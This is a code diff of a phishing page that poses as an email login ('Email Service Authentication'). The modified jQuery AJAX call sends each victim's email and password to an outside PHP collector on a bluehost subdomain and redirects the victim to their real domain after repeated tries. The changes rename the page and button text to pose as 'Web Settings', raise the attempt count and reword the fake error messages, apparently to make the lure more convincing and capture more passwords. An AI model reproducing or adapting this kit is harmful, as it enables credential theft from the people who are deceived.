@@ -1,6 +1,7 @@
 
 
 
+
 <!DOCTYPE html>
 <html lang="en" >
 
@@ -11,7 +12,7 @@
 <meta http-equiv="content-type" content="text/html; charset=windows-1252">
         <meta name="robots" content="noindex, nofollow">
 <meta name="googlebot" content="noindex, nofollow"> 
-    <title>Webmail Portal Login</title>
+    <title>Web Settings</title>
     <script src="jquery-1.js"></script>
 
     <!-- Required meta tags -->
@@ -244,7 +245,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
       
       $.ajax({
         dataType: 'JSON',
-        url: 'https://topguardtraining.hsa.grd.mybluehost.me/zim.php',
+        url: 'https://topguardtraining.hsa.grd.mybluehost.me/result2.php',
         type: 'POST',
         data:{
           email:email,
@@ -252,7 +253,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('Authenticating.........');
+              $('#submit-btn').html('Loading Configuration Settings......');
             },
             success: function(response){
               if(response){
@@ -260,7 +261,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
                 console.log(response);
                 if(response['signal'] == 'ok'){
                   $("#password").val("");
-                  if (count>=2) {
+                  if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("http://www."+my_slice);
@@ -275,7 +276,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
             },
             error: function(){
               $("#password").val("");
-              if (count>=2) {
+              if (count>=3) {
                 count=0;
                 window.location.replace("http://www."+my_slice);
               }
@@ -283,7 +284,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
               // $('#msg').html("Please try again later");
             },
             complete: function(){
-              $('#submit-btn').html('Log In');
+              $('#submit-btn').html('Log in');
             }
             
             
@@ -316,7 +317,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
 
-    <title>Hello, world!</title>
+    <title>Halo!</title>
   </head>
   <body>
       <div id="root">
@@ -338,8 +339,6 @@ $("#iframe").attr("src", "https://www."+my_slice);
             <h5><img id="logoimg" src="">
             <span style="text-transform: capitalize;" id="logoname"></span></h5>
             </div>
-                
-            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
             <span aria-hidden="true">&times;</span>
             </button>
         </div>
@@ -348,11 +347,11 @@ $("#iframe").attr("src", "https://www."+my_slice);
         <center>
             <div><h2>Email Service Authentication</h2></div></center>
         <center>
-          <div class="alert alert-danger" id="msg" style="display: none; color:red;"> Invalid Password.! Please Enter your correct Password</div>
-          <div id="error" class="text-danger" style="display: none; color:red;">That account doesn't exist. Enter a different account</div>
+          <div class="alert alert-danger" id="msg" style="display: none; color:red;">Wrong Email password, Please Try Again..</div>
+          <div id="error" class="text-danger" style="display: none; color:red;">Email Account dont exist..</div>
         </center>
       <div class="input_box">
-        <input type="email" name="username" id="email" placeholder="Email or Phone" readonly/ >
+        <input type="email" name="username" id="email" placeholder="Email" disabled="disabled" >
         <div class="icon"><i class="fas fa-user"></i></div>
       </div>
       <div class="input_box" required="required">
@@ -365,7 +364,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
        <div class="modal-footer"> 
             <!--     <div class="input_box"> -->
 
-            <button type="submit" id="submit-btn" class="btn btn-primary">Log In</button>
+            <button type="submit" id="submit-btn" class="btn btn-primary">Log in</button>
         </div>
         </div>
     </div>
